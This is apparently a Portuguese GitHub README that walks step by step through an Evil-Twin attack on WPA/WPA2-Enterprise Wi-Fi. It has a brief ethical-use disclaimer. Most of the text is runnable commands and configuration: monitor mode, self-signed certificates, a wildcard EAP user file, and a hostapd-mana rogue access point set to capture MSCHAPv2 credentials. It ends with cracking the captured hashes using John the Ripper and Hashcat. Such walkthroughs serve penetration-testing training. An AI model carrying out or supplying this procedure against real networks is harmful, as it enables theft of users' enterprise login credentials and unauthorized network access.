# Criação de um Evil-Twin em Rede WPA-Enterprise

Este repositório documenta o processo de criação de um ataque *Evil-Twin* em uma rede Wi-Fi com segurança WPA/WPA2-Enterprise. O objetivo é demonstrar as vulnerabilidades e ajudar profissionais de segurança a entender e mitigar esse tipo de ameaça.

> [\!WARNING]
> **AVISO DE USO ÉTICO**
> As informações e os comandos aqui apresentados devem ser utilizados **exclusivamente em ambientes de teste controlados e autorizados (laboratórios de pentest)**. A utilização dessas técnicas em redes sem permissão explícita é ilegal e antiética. O autor não se responsabiliza pelo mau uso deste material.

## O que é um Evil-Twin em WPA-Enterprise?

Um ataque *Evil-Twin* consiste em criar um ponto de acesso (AP) falso com o mesmo nome (SSID) de uma rede legítima. No contexto de WPA-Enterprise, que usa autenticação 802.1X/EAP em vez de uma senha compartilhada (PSK), o objetivo é enganar os usuários para que se conectem ao AP malicioso. Uma vez conectados, o atacante pode interceptar o processo de autenticação para capturar credenciais, geralmente na forma de hashes (MSCHAPv2), que podem ser quebrados offline.

## Pré-requisitos

  * Uma distribuição Linux para pentest (ex: Kali Linux).
  * Uma placa de rede sem fio que suporte o modo monitor e injeção de pacotes.
  * `aircrack-ng` suite.
  * `hostapd-mana` instalado.
  * `openssl` para geração de certificados.
  * Ferramentas de quebra de senha como `John the Ripper` ou `Hashcat`.

-----

## Passo a Passo

### 1\. Preparar a Interface de Rede

Primeiro, identifique o nome da sua interface de rede sem fio e coloque-a em modo monitor.

```bash
# Ver os parâmetros da interface de rede (ex: wlan0)
iwconfig
```

```bash
# Colocar a interface em modo monitor
sudo airmon-ng start wlan0
# Isso criará uma nova interface, geralmente chamada wlan0mon
```

### 2\. Instalar o Hostapd-mana

`hostapd-mana` é uma versão modificada do `hostapd` projetada para ataques de Wi-Fi, incluindo a capacidade de atuar como um servidor EAP malicioso.

```bash
sudo apt update
sudo apt install hostapd-mana
```

### 3\. Gerar Certificados e Chaves para o Servidor TLS

Para que o servidor EAP funcione, ele precisa de certificados para estabelecer um túnel TLS com os clientes. Vamos gerar um conjunto de certificados autoassinados.

```bash
# 1. Gera uma chave privada RSA para o servidor.
# Esta é a peça secreta que prova a identidade do servidor.
openssl genrsa -out server.key 2048

# 2. Gera uma Certificate Signing Request (CSR).
# Contém a chave pública e informações que seriam assinadas por uma autoridade certificadora.
openssl req -new -sha256 -key server.key -out csr.csr

# 3. Cria um certificado autoassinado (X.509) a partir do CSR e da chave privada.
# Em laboratórios, é comum usar certificados autoassinados para simular um servidor TLS.
openssl req -x509 -sha256 -days 365 -key server.key -in csr.csr -out server.pem

# 4. Gera parâmetros Diffie-Hellman para a troca segura de chaves.
openssl dhparam 2048 > dhparam.pem

# 5. Cria um link simbólico de server.pem para ca.pem.
# Em algumas configurações, o servidor precisa de um arquivo ca.pem como autoridade certificadora.
ln -s server.pem ca.pem
```

### 4\. Criar Arquivo de Configuração EAP

Este arquivo define os tipos de autenticação EAP que o nosso servidor falso irá aceitar e as credenciais que ele pode reconhecer.

```bash
# Crie e edite o arquivo de usuários EAP
sudo nano hostapd.eap_user
```

Cole o seguinte conteúdo no arquivo. A primeira linha com `*` é um *wildcard* que aceita qualquer identidade de usuário e tenta os métodos listados. A segunda linha é um exemplo de usuário específico.

```ini
* PEAP,TTLS,TLS,MD5,GTC
"t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP "1234test" [2]
```

### 5\. Criar Arquivo de Configuração do Ponto de Acesso Falso

Este é o arquivo principal que define todos os parâmetros do nosso *Evil-Twin*.

```bash
# Crie e edite o arquivo de configuração do AP
sudo nano fakeap.conf
```

Cole e ajuste o conteúdo abaixo. **Altere os caminhos dos arquivos de certificado** para o diretório onde você os gerou (ex: `/home/kali/`).

```ini
# Indica a interface de rede que será utilizada (em modo monitor)
interface=wlan0mon

# Indica o SSID que será anunciado (use o nome da rede alvo)
ssid=NOME-DA-REDE-ALVO

# Define a família de modulação (g = 802.11g)
hw_mode=g

# Canal em que será anunciado o SSID
channel=6

# Driver de comunicação com o kernel
driver=nl80211

# --- Configurações de Segurança WPA-Enterprise ---

# Habilita modos WPA/WPA2
wpa=3

# Indica que o gerenciamento de chaves é por EAP (Enterprise)
wpa_key_mgmt=WPA-EAP

# Cifras permitidas
wpa_pairwise=TKIP CCMP

# Habilita o padrão 802.1X
ieee8021x=1

# Indica que o AP atuará como servidor EAP
eap_server=1

# Aponta para o arquivo que descreve as identidades/credenciais EAP
eap_user_file=/home/kali/hostapd.eap_user

# Arquivo com o certificado da autoridade certificadora
ca_cert=/home/kali/ca.pem

# Certificado X.509 do servidor
server_cert=/home/kali/server.pem

# Chave privada correspondente ao certificado do servidor
private_key=/home/kali/server.key

# Parâmetros DH para a negociação TLS/EAP
dh_file=/home/kali/dhparam.pem

# --- Configurações Específicas do Mana ---

# Ativa a emulação de backends EAP para capturar credenciais
mana_wpe=1

# Registra as autenticações EAP bem-sucedidas
mana_eapsuccess=1

# Arquivo de saída onde as credenciais capturadas são armazenadas
mana_credout=hostapd.creds
```

### 6\. Executar o Ataque

Com todos os arquivos de configuração prontos, inicie o `hostapd-mana`.

```bash
sudo hostapd-mana fakeap.conf
```

O terminal exibirá os logs do ponto de acesso. Quando um cliente tentar se conectar, você verá as tentativas de autenticação e, se for bem-sucedido, as credenciais serão salvas no arquivo `hostapd.creds`.

### 7\. Coletar e Quebrar o Hash

Após capturar uma tentativa de autenticação (MSCHAPv2), o hash será salvo no formato `john` no arquivo `hostapd.creds`.

```bash
# Visualize o hash capturado
cat hostapd.creds
```

O hash terá um formato similar a: `user::$DOMAIN:LM_HASH:NT_HASH:challenge`.

Copie a linha inteira do hash e salve-a em um novo arquivo.

```bash
# Salve o hash para ser quebrado
nano hash.txt
```

Agora, use `John the Ripper` ou `Hashcat` para quebrar o hash usando uma *wordlist*.

**Usando John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Usando Hashcat:**

O modo `-m 5500` é para NetNTLMv1, que é o formato do hash MSCHAPv2.

```bash
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt -O
```

Se a senha do usuário estiver na *wordlist*, a ferramenta a encontrará e a exibirá no terminal.
